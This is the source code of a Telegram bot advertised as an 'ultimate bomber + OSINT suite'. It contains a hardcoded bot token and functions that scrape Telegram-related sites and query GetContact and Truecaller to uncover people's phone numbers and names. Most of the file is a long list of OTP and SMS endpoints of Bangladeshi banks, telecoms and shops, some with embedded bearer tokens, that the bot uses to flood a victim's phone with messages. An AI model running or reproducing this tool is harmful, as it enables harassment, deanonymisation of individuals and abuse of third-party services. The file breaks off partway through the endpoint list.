'use strict';
// ══════════════════════════════════════════════════════
// MAFIA CYBER WORLD — ULTIMATE BOMBER + OSINT SUITE
// 406 APIs Embedded. Mass Bombing. TG Lookup. BD Info. IP Tracker.
// ══════════════════════════════════════════════════════

const TOKEN    = process.env.TOKEN    || '8507242435:AAGKrkIpdfgtYKTh7nJy4R8F-Vr0VukhuJ8';
const ADMIN_ID = String(process.env.ADMIN_ID || '8294558143');

// 🔍 নাম্বার খোঁজার জন্য API টোকেন (ঐচ্ছিক, তবে থাকলে ১০০% কাজ করবে)
const GC_TOKEN = process.env.GC_TOKEN || ''; // GetContact Bearer Token
const TC_AUTH  = process.env.TC_AUTH  || ''; // Truecaller Auth Token

const TBot   = require('node-telegram-bot-api');
const axios  = require('axios');
const crypto = require('crypto');
const fs     = require('fs');

const CFG = {
    TOKEN, ADMIN_ID, GC_TOKEN, TC_AUTH,
    DATA_FILE:       process.env.DATA_FILE || '/tmp/mafia-data.json',
    RATE_LIMIT_MS:   10000,
    RATE_MAX:        5,
    CONCURRENCY:     20, // একসাথে ২০টা রিকোয়েস্ট
};

const log = {
    _w: (l, m) => console.log(`[${new Date().toISOString()}] ${l}: ${m}`),
    info:  m => log._w('INFO ', m),
    warn:  m => log._w('WARN ', m),
    error: m => log._w('ERROR', m),
};

// ── Store ──
let store = { users:{}, pending:{}, rate:{} };
const saveStore = () => { try { const t = CFG.DATA_FILE + '.tmp'; fs.writeFileSync(t, JSON.stringify(store), 'utf8'); fs.renameSync(t, CFG.DATA_FILE); } catch(e){} };
const loadStore = () => { try { if (fs.existsSync(CFG.DATA_FILE)) store = { ...store, ...JSON.parse(fs.readFileSync(CFG.DATA_FILE, 'utf8')) }; } catch(e){} };
loadStore();
setInterval(saveStore, 60000);

function getUser(uid) {
    uid = String(uid);
    if (!store.users[uid]) { store.users[uid] = { joined: Date.now(), banned: false, totalBombs: 0 }; saveStore(); }
    return store.users[uid];
}
const isAdmin = uid => String(uid) === CFG.ADMIN_ID;
const setPending = (uid, d) => { store.pending[String(uid)] = { ...d, createdAt: Date.now() }; };
const getPending = uid => store.pending[String(uid)] || null;
const delPending = uid => { delete store.pending[String(uid)]; saveStore(); };

function checkRate(uid) {
    uid = String(uid);
    if (isAdmin(uid)) return true;
    const now = Date.now(), r = store.rate[uid];
    if (!r || (now - r.window) > CFG.RATE_LIMIT_MS) { store.rate[uid] = { count: 1, window: now }; return true; }
    if (r.count >= CFG.RATE_MAX) return false;
    r.count++; return true;
}

// ══════════════════════════════════════════════════════
// 1. OSINT & LOOKUP ENGINES
// ══════════════════════════════════════════════════════
async function lookupTgUsername(username) {
    username = username.replace(/^@/, '').trim().toLowerCase();
    const res = { username, id: null, name: null, bio: null, phone: null, phoneSource: null, sources: [] };

    try {
        const tm = await axios.get(`https://t.me/${username}`, { headers: { 'User-Agent': 'TelegramBot/1.0' }, timeout: 8000 });
        const nm = tm.data.match(/<meta property="og:title" content="([^"]+)"/);
        const bm = tm.data.match(/<meta property="og:description" content="([^"]+)"/);
        if (nm) res.name = nm[1];
        if (bm) res.bio = bm[1];
        res.sources.push('t.me');
    } catch(e) {}

    try {
        const fr = await axios.get(`https://fragment.com/username/${encodeURIComponent(username)}`, { headers: { 'User-Agent': 'Mozilla/5.0' }, timeout: 8000 });
        const idM = fr.data.match(/"peer_id":(\d+)/);
        if (idM && !res.id) { res.id = idM[1]; res.sources.push('Fragment'); }
        const phM = fr.data.match(/\+\d[\d\s\-()]{6,14}\d/g);
        if (phM && !res.phone) { res.phone = phM[0].replace(/\s/g,''); res.phoneSource = 'Fragment'; res.sources.push('Fragment'); }
    } catch(e) {}

    try {
        const tg = await axios.get(`https://tgstat.com/channel/@${username}`, { headers: { 'User-Agent': 'Mozilla/5.0' }, timeout: 8000 });
        const m = tg.data.match(/tg:\/\/user\?id=(\d+)/);
        if (m && !res.id) { res.id = m[1]; res.sources.push('TGStat'); }
    } catch(e) {}

    if (CFG.GC_TOKEN) {
        try {
            const gc = await axios.post('https://pbhs2.getcontact.com/profile/v3/search',
                { query: username, countryCode: 'BD', source: 'SEARCH' },
                { headers: { 'Authorization': `Bearer ${CFG.GC_TOKEN}`, 'User-Agent': 'GetContact/7.0.0 (Android 13)', 'Content-Type': 'application/json' }, timeout: 10000 });
            if (gc && gc.data && gc.data.result) {
                const profiles = gc.data.result.profiles || (Array.isArray(gc.data.result) ? gc.data.result : [gc.data.result]);
                for (const p of profiles) {
                    const ph = p.phone || p.phoneNumber;
                    if (ph) { res.phone = ph.startsWith('+') ? ph : '+' + ph; res.phoneSource = 'GetContact'; res.sources.push('GetContact'); break; }
                }
            }
        } catch(e) { log.warn('[OSINT] GetContact failed'); }
    }
    return res;
}

async function lookupBdNumber(phone) {
    let p = phone.replace(/\D/g, '');
    if (p.startsWith('880')) p = p.substring(2);
    if (!p.startsWith('0')) p = '0' + p;
    
    const res = { phone: p, carrier: 'Unknown', location: 'Bangladesh', name: null };
    const prefixes = {
        '013': 'Grameenphone (GP)', '017': 'Grameenphone (GP)',
        '014': 'Banglalink', '019': 'Banglalink',
        '015': 'Teletalk', '016': 'Airtel (Robi)', '018': 'Robi'
    };
    
    for (const pre in prefixes) {
        if (p.startsWith(pre)) { res.carrier = prefixes[pre]; break; }
    }

    if (CFG.GC_TOKEN) {
        try {
            const gc = await axios.post('https://pbhs2.getcontact.com/profile/v3/search',
                { query: p, countryCode: 'BD', source: 'PHONE' },
                { headers: { 'Authorization': `Bearer ${CFG.GC_TOKEN}`, 'User-Agent': 'GetContact/7.0.0 (Android 13)', 'Content-Type': 'application/json' }, timeout: 10000 });
            if (gc && gc.data && gc.data.result) {
                const n = gc.data.result.displayName || gc.data.result.name;
                if (n) res.name = n;
            }
        } catch(e) {}
    }

    if (!res.name && CFG.TC_AUTH) {
        try {
            const tc = await axios.get(`https://search5-noneu.truecaller.com/v2/search?q=${p}&countryCode=BD&type=4&placement=SEARCHRESULTS,APP,FALSE&encoding=json`,
                { headers: { 'Authorization': CFG.TC_AUTH, 'User-Agent': 'Truecaller/13.0.0 (Android 13)', 'Accept': 'application/json' }, timeout: 10000 });
            if (tc && tc.data && tc.data.data && tc.data.data.length) {
                res.name = tc.data.data[0].name;
            }
        } catch(e) {}
    }

    return res;
}

// ══════════════════════════════════════════════════════
// 2. THE ULTIMATE API DATABASE (406 Endpoints)
// ══════════════════════════════════════════════════════
const RAW_APIS = [
  {"id":"1","name":"QuizGiri","url":"https://developer.quizgiri.xyz/api/v2.0/send-otp?phone=*****&country_code=+880&fcm_token=null","method":"post","body":"","headers":{"content-type":"application/json"}},
  {"id":"2","name":"Shudokko","url":"http://lpin.dev.mpower-social.com:6001/usermodule/otp_mobile/?mobile_no=*****&email=xbomber_public%40gmail.com&verification_type=registration","method":"get","body":"","headers":{"content-type":"application/json"}},
  {"id":"3","name":"Web Access","url":"http://27.131.15.19/lstyle/api/lsotprequest","method":"post","body":"{\"shortcode\":\"2494905\",\"msisdn\":\"88*****\"}","headers":{"content-type":"application/json"}},
  {"id":"4","name":"CINESPOT","url":"http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-*****/operator-All/send","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"5","name":"Dhaka bank","url":"https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber","method":"post","body":"{\"AccessToken\":\"\",\"TrackingNo\":\"\",\"mobileNo\":\"*****\",\"otpSms\":\"\",\"product_id\":\"250\",\"requestChannel\":\"MOB\",\"trackingStatus\":5}","headers":{"content-type":"application/json"}},
  {"id":"6","name":"CIRCLE","url":"https://circle.robi.com.bd/mylife/gateway/register_fcm.php?regId&msisdn=88*****","method":"post","body":"","headers":{"content-type":"application/json"}},
  {"id":"7","name":"Health Plus 2","url":"http://45.114.85.19:8080/v3/otp/send?msisdn=88*****","method":"get","body":"","headers":{"content-type":"application/json"}},
  {"id":"8","name":"IQRA","url":"http://apibeta.iqra-live.com/api/v2/sent-otp/*****","method":"get","body":"","headers":{"x-user-channel":"apps"}},
  {"id":"9","name":"Shajgoj","url":"https://shop.shajgoj.com/wp-admin/admin-ajax.php","method":"post","body":"action=xoo_ml_login_with_otp&xoo-ml-phone-login=*****&xoo-ml-form-token=4840&xoo-ml-form-type=login_user_with_otp&redirect=%2Fmy-account%2F","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"10","name":"KhaoDao","url":"https://api.eat-z.com/auth/customer/signin","method":"post","body":"{\"username\":\"+88*****\"}","headers":{"content-type":"application/json"}},
  {"id":"11","name":"ALESHA_CARD","url":"https://aleshacard.com/api/register-otp?contact_no=*****","method":"post","body":"","headers":{"content-type":"application/json"}},
  {"id":"12","name":"TheMallBD","url":"https://themallbd.com/api/auth/otp_login","method":"post","body":"{\"phone_number\":\"+88*****\"}","headers":{"content-type":"application/json"}},
  {"id":"14","name":"Fundesh","url":"https://win.fundesh.com.bd/authSrv/auth/generateOtp","method":"post","body":"{\"msisdn\":\"*****\",\"clientId\":\"d2c_client\"}","headers":{"content-type":"application/json"}},
  {"id":"15","name":"Circle","url":"https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=13001&app_version=79&msisdn=88*****","method":"post","body":"","headers":{"content-type":"application/json"}},
  {"id":"16","name":"Vestige","url":"http://vstg-gateway-prod-1532961163.ap-south-1.elb.amazonaws.com/notification/api/v1/send/otp/v3","method":"post","body":"{\"mobileNumber\":\"88*****\",\"countryId\":22}","headers":{"content-type":"application/json"}},
  {"id":"17","name":"Ajkerdeal","url":"https://api.ajkerdeal.com/Recover/RetrivePassword/customersignup=null","method":"post","body":"{\"CustomerId\":\"01833268701\",\"MobileOrEmail\":\"*****\",\"Type\":2}","headers":{"content-type":"application/json"}},
  {"id":"18","name":"Dhaka bank 2","url":"https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber","method":"post","body":"{\"AccessToken\":\"\",\"TrackingNo\":\"\",\"mobileNo\":\"*****\",\"otpSms\":\"\",\"product_id\":\"250\",\"requestChannel\":\"MOB\",\"trackingStatus\":5}","headers":{"content-type":"application/json"}},
  {"id":"19","name":"Arogga","url":"https://api.arogga.com/v1/auth/sms/send?f=mobile&b=Chrome&v=101.0.4951.54&os=Android&osv=6.0","method":"post","body":"mobile=+88*****&fcmToken=&referral=","headers":{"content-type":"application/json"}},
  {"id":"20","name":"OsudPotro","url":"https://api-2.osudpotro.com/api/v1/users/send_otp","method":"post","body":"{\"mobile\":\"+88-*****\",\"deviceToken\":\"web\",\"language\":\"en\",\"os\":\"web\"}","headers":{"content-type":"application/json"}},
  {"id":"21","name":"Web Access 2","url":"http://27.131.15.19/lstyle/api/lsotprequest","method":"post","body":"{\"shortcode\":\"2494905\",\"msisdn\":\"88*****\"}","headers":{"content-type":"application/json"}},
  {"id":"22","name":"Shajgoj 2","url":"https://shop.shajgoj.com/wp-admin/admin-ajax.php","method":"post","body":"action=xoo_ml_login_with_otp&xoo-ml-phone-login=*****&xoo-ml-form-token=3563&xoo-ml-form-type=login_user_with_otp&redirect=%2Fmy-account%2F%3Ffbclid%3DIwAR2mUXNZgDYWrrONUqp61_3Ac4vtnaZUUcBUVwFVTjqgymp5x_2i0nULH_k","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"23","name":"Nesco","url":"http://nesco.sslwireless.com/api/v1/login","method":"post","body":"phone_number=*****","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"24","name":"ROBI WEB","url":"https://webapi.robi.com.bd/v1/send-otp","method":"post","body":"{\"phone_number\":\"*****\"}","headers":{"content-type":"application/json","Authorization":" Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3dlYmFwaS5yb2JpLmNvbS5iZC92MS90b2tlbiIsImlhdCI6MTY1Mjk2MTAyOSwiZXhwIjoxNjUzMDQ3NDI5LCJuYmYiOjE2NTI5NjEwMjksImp0aSI6IjBXSW9ld0U3bzFJRVNHTVUiLCJzdWIiOiJSb2JpV2ViU2l0ZSJ9.lxP2K3WU36mO8By_dNiVO3VYOSajRofD-Rhqb-0y8ok"}},
  {"id":"25","name":"Shajgoj 3","url":"https://shop.shajgoj.com/wp-admin/admin-ajax.php","method":"post","body":"action=xoo_ml_login_with_otp&xoo-ml-phone-login=*****&xoo-ml-form-token=3490&xoo-ml-form-type=login_user_with_otp&redirect=%252Fmy-account%252F&=","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"26","name":"Bongo","url":"https://api.bongo-solutions.com/auth/api/login/send-otp","method":"post","body":"{\"operator\":\"all\",\"msisdn\":\"88*****\"}","headers":{"content-type":"application/json"}},
  {"id":"27","name":"Cinematic","url":"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88*****","method":"post","body":"","headers":{"content-type":"application/json","Authorization":"Bearer 1pake4mh5ln64h5t26kpvm3iri"}},
  {"id":"28","name":"Ali2BD","url":"https://edge.ali2bd.com/api/consumer/v1/auth/login","method":"post","body":"{\"username\":\"+88*****\"}","headers":{"content-type":"application/json"}},
  {"id":"29","name":"Admissionbd","url":"https://api.arifmodz.my.id/V2/admissionbd.php?phone=*****","method":"post","body":"","headers":{"content-type":"application/json"}},
  {"id":"30","name":"Ali2bd","url":"https://api.arifmodz.my.id/V2/ali2bd.php?phone=*****","method":"post","body":"","headers":{"content-type":"application/json"}},
  {"id":"31","name":"AppLink","url":"https://api.arifmodz.my.id/V2/applink.php?phone=*****","method":"post","body":"","headers":{"content-type":"application/json"}},
  {"id":"32","name":"Arogga 2","url":"https://api.arifmodz.my.id/V2/arogga.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"33","name":"Bikroy","url":"https://api.arifmodz.my.id/V2/bikroy.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"34","name":"MuBl","url":"https://api.arifmodz.my.id/V2/bl.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"35","name":"ChainaOnline","url":"https://api.arifmodz.my.id/V2/chainaonline.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"36","name":"Chokrojan","url":"https://api.arifmodz.my.id/V2/chakrajan.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"37","name":"Chorki","url":"https://api.arifmodz.my.id/V2/chorki.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"38","name":"Circle","url":"https://api.arifmodz.my.id/V2/circel.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"39","name":"DhakaBank","url":"https://api.arifmodz.my.id/V2/dhakabank.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"40","name":"Deepto","url":"https://api.arifmodz.my.id/V2/dipto.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"41","name":"Doctime","url":"https://api.arifmodz.my.id/V2/doctime.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"42","name":"Easy.com","url":"https://api.arifmodz.my.id/V2/easy.com.bd.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"43","name":"Ecourier","url":"https://api.arifmodz.my.id/V2/ecuriar.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"44","name":"Flexiplan","url":"https://api.arifmodz.my.id/V2/flexi-plan.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"45","name":"Fliper","url":"https://api.arifmodz.my.id/V2/fliper.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"46","name":"Fundedh","url":"https://api.arifmodz.my.id/V2/fundesh.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"47","name":"Ghuri","url":"https://api.arifmodz.my.id/V2/ghuri.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"48","name":"Gpoffer","url":"https://api.arifmodz.my.id/V2/gp.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"49","name":"Gpshop","url":"https://api.arifmodz.my.id/V2/gpshop.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"50","name":"HishabExp","url":"https://api.arifmodz.my.id/V2/hisab-express.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"51","name":"HishabLogin","url":"https://api.arifmodz.my.id/V2/hisabelogin.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"52","name":"Ivr","url":"https://api.arifmodz.my.id/V2/ivr.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"53","name":"Jeetwinbd","url":"https://api.arifmodz.my.id/V2/jeetwinbd.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"54","name":"Jotno","url":"https://api.arifmodz.my.id/V2/jotno.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"55","name":"Mcb","url":"https://api.arifmodz.my.id/V2/mcbaffiliate.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"56","name":"Mokam","url":"https://api.arifmodz.my.id/V2/mokam.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"57","name":"Moveon","url":"https://api.arifmodz.my.id/V2/moveon.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"58","name":"Obhai","url":"https://api.arifmodz.my.id/V2/obhai.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"59","name":"Robinyoffer","url":"https://api.arifmodz.my.id/V2/robi-myoffer.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"60","name":"Robiweb","url":"https://api.arifmodz.my.id/V2/robi-web.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"61","name":"Robiweb2","url":"https://api.arifmodz.my.id/V2/robi-web2.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"62","name":"Rtvreg","url":"https://api.arifmodz.my.id/V2/rtv-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"63","name":"Rtvlogin","url":"https://api.arifmodz.my.id/V2/rtv-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"64","name":"Shadhin","url":"https://api.arifmodz.my.id/V2/sadhin.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"65","name":"Sajgoj","url":"https://api.arifmodz.my.id/V2/sajgoj.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"66","name":"Shopotreg","url":"https://api.arifmodz.my.id/V2/sopoth-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"67","name":"Shopotlog","url":"https://api.arifmodz.my.id/V2/sopoth-resend.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"68","name":"Tallykhata","url":"https://api.arifmodz.my.id/V2/talikhata.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"69","name":"Bkash","url":"https://www.sineorbiz.com/wp-content/plugins/bkash.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/json"}},
  {"id":"70","name":"Castomis Api","url":"https://www.tokaweb.xyz/sms.php?number=*****&sms=Hi Good Morning","method":"get","body":"","headers":{"content-type":"application/json"}},
  {"id":"71","name":"Rabbitholebd","url":"https://apix.rabbitholebd.com/appv2/login/requestOTP","method":"post","body":"{\"mobile\":\"*****\"}","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"72","name":"osudpotro","url":"https://api.osudpotro.com/api/v1/users/send_otp","method":"post","body":"{\"mobile\":\"+88*****\",\"deviceToken\":\"web\",\"language\":\"en\",\"os\":\"web\"}","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"73","name":"Shopoth","url":"https://api.shopoth.com/shop/api/v1/otps/send","method":"post","body":"{\"phone\":\"*****\"}","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"74","name":"AProd","url":"https://prod-api.viewlift.com/identity/signup?site=hoichoitv","method":"post","body":"{\"requestType\":\"send\",\"phoneNumber\":\"+88*****\",\"emailConsent\":true,\"whatsappConsent\":true}","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"75","name":"Go App","url":"https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php","method":"post","body":"{\"full_name\":\"BLACKFIRE\",\"company_name\":\"Bomber\",\"email_address\":\"blactfiretools@gmail.com\",\"phone_number\":\"*****\"}","headers":{"content-type":"application/json"}},
  {"id":"76","name":"8m-forget.php","url":"https://api.blackfire-tools.xyz/8m-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"77","name":"b8m-reg.php","url":"https://api.blackfire-tools.xyz/b8m-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"78","name":"admissionbd.php","url":"https://api.blackfire-tools.xyz/admissionbd.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"79","name":"aibl.php","url":"https://api.blackfire-tools.xyz/aibl.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"80","name":"ail2bd.php","url":"https://api.blackfire-tools.xyz/ali2bd.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"81","name":"apex.php","url":"https://api.blackfire-tools.xyz/apex.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/json"}},
  {"id":"82","name":"applink.php","url":"https://api.blackfire-tools.xyz/applink.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"83","name":"arogga.php","url":"https://api.blackfire-tools.xyz/arogga.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"84","name":"bdtikets.php","url":"https://api.blackfire-tools.xyz/bdtikets.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"85","name":"bdtikets2.php","url":"https://api.blackfire-tools.xyz/bdtikets2.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"86","name":"betonbook.php","url":"https://api.blackfire-tools.xyz/betonbook.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"87","name":"bikroy.php","url":"https://api.blackfire-tools.xyz/bikroy.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"88","name":"bioscope.php","url":"https://api.blackfire-tools.xyz/bioscope.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"89","name":"bjbaji.php","url":"https://api.blackfire-tools.xyz/bjbaji.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"90","name":"bkash.php","url":"https://api.blackfire-tools.xyz/bkash.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"91","name":"bl.php","url":"https://api.blackfire-tools.xyz/bl.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"92","name":"bongobd.php","url":"https://api.blackfire-tools.xyz/bongobd.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"93","name":"busbdlogin.php","url":"https://api.blackfire-tools.xyz/busbdlogin.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"94","name":"chainaonline.php","url":"https://api.blackfire-tools.xyz/chainaonline.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"95","name":"chakrajan.php","url":"https://api.blackfire-tools.xyz/chakrajan.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"96","name":"chorki.php","url":"https://api.blackfire-tools.xyz/chorki.php?phone=*****","method":"post","body":"","headers":{"content-type":"application/json"}},
  {"id":"97","name":"cinematic.php","url":"https://api.blackfire-tools.xyz/cinematic.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"98","name":"cineplex.php","url":"https://api.blackfire-tools.xyz/cineplex.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"99","name":"cinespot.php","url":"https://api.blackfire-tools.xyz/cinespot.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"100","name":"circel.php","url":"https://api.blackfire-tools.xyz/circel.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"101","name":"daktarbhai.php","url":"https://api.blackfire-tools.xyz/daktarbhai.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"102","name":"dhakabank.php","url":"https://api.blackfire-tools.xyz/dhakabank.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/json"}},
  {"id":"103","name":"dipto.php","url":"https://api.blackfire-tools.xyz/dipto.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/json"}},
  {"id":"104","name":"dmss.php","url":"https://api.blackfire-tools.xyz/dmss.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"105","name":"doctime.php","url":"https://api.blackfire-tools.xyz/doctime.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"106","name":"easy.com.bd","url":"https://api.blackfire-tools.xyz/easy.com.bd.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"107","name":"ecuriar.php","url":"https://api.blackfire-tools.xyz/ecuriar.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"108","name":"engage-token.php","url":"https://api.blackfire-tools.xyz/engage-token.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/json"}},
  {"id":"109","name":"engage.php","url":"https://api.blackfire-tools.xyz/engage.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"110","name":"enobazar.php","url":"https://api.blackfire-tools.xyz/enobazar.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"111","name":"entertainment.php","url":"https://api.blackfire-tools.xyz/entertainment.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"112","name":"eshop-bl.php","url":"https://api.blackfire-tools.xyz/eshop-bl.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"113","name":"flexi-plan.php","url":"https://api.blackfire-tools.xyz/flexi-plan.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"114","name":"fliper.php","url":"https://api.blackfire-tools.xyz/fliper.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"115","name":"food-collection.php","url":"https://api.blackfire-tools.xyz/food-collection.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"116","name":"fsibl.php","url":"https://api.blackfire-tools.xyz/fsibl.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"117","name":"fundesh.php","url":"https://api.blackfire-tools.xyz/fundesh.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"118","name":"ghuri.php","url":"https://api.blackfire-tools.xyz/ghuri.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"119","name":"gibinfo.php","url":"https://api.blackfire-tools.xyz/gibinfo.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"120","name":"gp.php","url":"https://api.blackfire-tools.xyz/gp.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"121","name":"gpay.php","url":"https://api.blackfire-tools.xyz/gpay.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"122","name":"gpfi.php","url":"https://api.blackfire-tools.xyz/gpfi.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"123","name":"gpshop.php","url":"https://api.blackfire-tools.xyz/gpshop.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
